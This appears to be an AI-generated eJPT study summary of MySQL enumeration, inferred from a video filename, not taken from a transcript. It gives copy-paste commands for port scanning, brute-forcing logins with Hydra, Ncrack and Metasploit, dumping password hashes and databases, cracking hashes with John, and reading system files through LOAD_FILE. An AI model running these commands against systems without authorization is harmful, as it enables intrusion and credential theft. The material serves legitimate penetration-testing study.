# What the video covers (Introduction / big picture)
Note: No transcript was provided. The following is a conservative, eJPT-focused summary inferred from the filename “12 - MySQL Enumeration.mp4” in the Enumeration module.

This video likely demonstrates how to enumerate a MySQL/MariaDB service during the enumeration phase:
- Detect and fingerprint MySQL (default TCP/3306).
- Check common/default/weak credentials.
- Log in and enumerate version, users, privileges, databases, tables, and sensitive data.
- Use Nmap NSE, mysql client, and brute-force tools.
- Dump data safely and document findings.

# Flow (ordered)
1. Discover and fingerprint port 3306 with Nmap.
2. Run targeted Nmap NSE scripts for MySQL metadata.
3. Quick credential checks (empty/weak passwords; root/admin/common users).
4. Brute-force (only if allowed) with Hydra/Ncrack/Metasploit.
5. Log in via mysql client; verify version and current user/privileges.
6. Enumerate databases, tables, and columns; hunt for likely sensitive tables/columns.
7. Review MySQL users, auth plugins, and privileges.
8. Dump interesting data (mysqldump) when permitted.
9. Optional: use Nmap NSE or Metasploit with valid creds to automate deeper enumeration.
10. Save artifacts and plan next actions (e.g., hash cracking, webshell via FILE privilege if in scope).

# Tools highlighted
- Nmap with MySQL NSE: mysql-info, mysql-enum, mysql-users, mysql-databases, mysql-variables, mysql-dump-hashes, mysql-empty-password, mysql-brute
- mysql client utilities: mysql, mysqlshow, mysqldump
- Password attack tools: Hydra, Ncrack, Medusa
- Metasploit auxiliary scanners: mysql_login, mysql_version, mysql_schemadump, mysql_hashdump
- Hash cracking: John the Ripper or Hashcat (for mysql_native_password hashes)

# Typical command walkthrough (detailed, copy-paste friendly)
Set common variables to speed up copy/paste:
```bash
IP=10.10.10.10
U=root
P='password123'
```

Discovery and fingerprinting:
```bash
# Quick scan of MySQL port
nmap -sC -sV -p 3306 $IP

# Focused MySQL scripts (safe)
nmap -p 3306 --script mysql-info,mysql-enum $IP

# All MySQL scripts (may include brute; review first with --script-help)
nmap -p 3306 --script 'mysql-* and not mysql-brute' $IP
```

Quick credential checks:
```bash
# Check anonymous/empty password quickly
nmap -p 3306 --script mysql-empty-password $IP

# Try interactive login (blank password)
mysql -h $IP -u root

# Try common usernames (non-interactive password). Beware shell history.
mysql -h $IP -u root -p"$P" -e "SELECT VERSION();"
```

Hydra/Ncrack brute-force (only with permission):
```bash
# Single user, wordlist
hydra -l root -P /usr/share/wordlists/rockyou.txt -s 3306 -f $IP mysql

# Multiple users and passwords
hydra -L users.txt -P passwords.txt -s 3306 -vV -o hydra_mysql.txt $IP mysql

# Ncrack alternative
ncrack -v -p mysql://$IP -u root -P passwords.txt
```

Post-authentication enumeration via mysql client:
```bash
# One-liners
mysql -h $IP -u $U -p"$P" -e "SELECT VERSION(), @@version_comment, @@hostname, @@port;"
mysql -h $IP -u $U -p"$P" -e "SELECT CURRENT_USER(), USER();"
mysql -h $IP -u $U -p"$P" -e "SHOW GRANTS FOR CURRENT_USER();"
mysql -h $IP -u $U -p"$P" -e "SHOW VARIABLES LIKE 'secure_file_priv';"
mysql -h $IP -u $U -p"$P" -e "SHOW DATABASES;"

# List schemas, tables, columns (excluding system schemas)
mysql -h $IP -u $U -p"$P" -e "SELECT schema_name FROM information_schema.schemata;"
mysql -h $IP -u $U -p"$P" -e "SELECT table_schema,COUNT(*) FROM information_schema.tables GROUP BY table_schema;"
mysql -h $IP -u $U -p"$P" -e "SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys') ORDER BY table_schema,table_name LIMIT 200;"

# Hunt for interesting names
mysql -h $IP -u $U -p"$P" -e "SELECT table_schema,table_name FROM information_schema.tables WHERE table_name RLIKE '(user|account|pass|credential|login|member|token)' ORDER BY table_schema,table_name;"
mysql -h $IP -u $U -p"$P" -e "SELECT table_schema,table_name,column_name,data_type FROM information_schema.columns WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys') AND column_name RLIKE '(user|mail|email|pass|hash|token)' ORDER BY table_schema,table_name;"

# MySQL users and auth info (requires privileges)
mysql -h $IP -u $U -p"$P" -e "SELECT user,host,plugin,authentication_string FROM mysql.user;"
```

Dump data:
```bash
# List tables in a specific DB
DB=appdb
mysql -h $IP -u $U -p"$P" -e "USE $DB; SHOW TABLES;"

# Peek a table
mysql -h $IP -u $U -p"$P" -e "USE $DB; SELECT * FROM users LIMIT 5;"

# Dump a database
mysqldump -h $IP -u $U -p"$P" $DB > ${DB}.sql

# Dump all databases (may be large; ensure scope permits)
mysqldump -h $IP -u $U -p"$P" --all-databases > all_dbs.sql
```

Nmap NSE with credentials:
```bash
# Users, databases, variables with creds
nmap -p 3306 --script mysql-users,mysql-databases,mysql-variables \
  --script-args "mysqluser=$U,mysqlpass=$P" $IP

# Dump hashes if permitted (then crack offline)
nmap -p 3306 --script mysql-dump-hashes --script-args "mysqluser=$U,mysqlpass=$P" $IP
```

Metasploit helpers:
```bash
msfconsole -q -x "
use auxiliary/scanner/mysql/mysql_version;
set RHOSTS $IP;
run;
use auxiliary/scanner/mysql/mysql_login;
set RHOSTS $IP;
set USERNAME root;
set PASS_FILE /usr/share/wordlists/rockyou.txt;
run;
set USERNAME $U;
set PASSWORD $P;
run;
use auxiliary/scanner/mysql/mysql_schemadump;
set RHOSTS $IP;
set USERNAME $U;
set PASSWORD $P;
run;
use auxiliary/scanner/mysql/mysql_hashdump;
set RHOSTS $IP;
set USERNAME $U;
set PASSWORD $P;
run;
exit"
```

File read/write checks (only enumerate if in scope; requires FILE or SUPER privileges):
```bash
# Check if file operations are possible
mysql -h $IP -u $U -p"$P" -e "SHOW VARIABLES LIKE 'secure_file_priv'; SHOW VARIABLES LIKE 'local_infile';"
# Read a file (if FILE privilege)
mysql -h $IP -u $U -p"$P" -e "SELECT LOAD_FILE('/etc/passwd');"
# Write a file into allowed directory (depends on secure_file_priv)
mysql -h $IP -u $U -p"$P" -e "SELECT 'test' INTO OUTFILE '/tmp/mysql_test.txt';"
```

Optional: prepare hashes for cracking (mysql_native_password):
```bash
# Save user:hash for John
mysql -h $IP -u $U -p"$P" -e "SELECT CONCAT(user,':',authentication_string) FROM mysql.user WHERE plugin='mysql_native_password' AND authentication_string<>'';" | tee mysql_hashes.txt

# Crack with John (format may vary by plugin/version)
john --wordlist=/usr/share/wordlists/rockyou.txt --format=mysql-sha1 mysql_hashes.txt
```

# Practical tips
- Default port is 3306 (33060 is MySQL X Plugin). MariaDB banners often show “MariaDB.”
- Remote root login is often disabled or bound to localhost; try other users (app, dev, test, admin).
- Start with safe NSE scripts; only run brute-force if explicitly permitted.
- MySQL account lockout is uncommon, but servers may throttle; tune Hydra threads (-t) and timing.
- Prefer non-interactive enumeration with -e and capture outputs to files for reporting.
- Check CURRENT_USER() vs USER() to detect proxy accounts or privilege changes.
- Use information_schema to avoid touching system schemas unless needed.
- secure_file_priv controls where you can read/write files; NULL disables, empty allows all, path restricts to a directory.
- Respect data sensitivity. Limit SELECTs and dumps to what’s in scope.

# Minimal cheat sheet (one-screen flow)
```bash
IP=10.10.10.10; U=root; P='password123'

# Discover + fingerprint
nmap -sC -sV -p 3306 $IP
nmap -p 3306 --script mysql-info,mysql-enum $IP

# Quick auth checks
nmap -p 3306 --script mysql-empty-password $IP
mysql -h $IP -u root
mysql -h $IP -u $U -p"$P" -e "SELECT VERSION(),CURRENT_USER();SHOW DATABASES;"

# Post-auth essentials
mysql -h $IP -u $U -p"$P" -e "SHOW GRANTS FOR CURRENT_USER();"
mysql -h $IP -u $U -p"$P" -e "SELECT user,host,plugin FROM mysql.user;"
mysql -h $IP -u $U -p"$P" -e "SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys') LIMIT 200;"
mysql -h $IP -u $U -p"$P" -e "SELECT table_schema,table_name FROM information_schema.tables WHERE table_name RLIKE '(user|pass|cred|login|token)';"

# Dump a target DB
DB=appdb; mysqldump -h $IP -u $U -p"$P" $DB > ${DB}.sql

# NSE with creds
nmap -p 3306 --script mysql-users,mysql-databases --script-args "mysqluser=$U,mysqlpass=$P" $IP
```

# Summary
Without the transcript, this inferred module focuses on practical MySQL enumeration for eJPT:
- Identify and fingerprint MySQL services (3306) with Nmap and NSE.
- Test for empty/weak credentials, then carefully brute-force if authorized.
- Upon access, use mysql client to enumerate version, current user, grants, server variables, and the information_schema for databases, tables, and columns.
- Target likely sensitive data sets and dump only what’s within scope.
- Automate with Nmap NSE and Metasploit modules when you have valid credentials.
- Note file read/write capabilities via FILE/secure_file_priv and handle with care.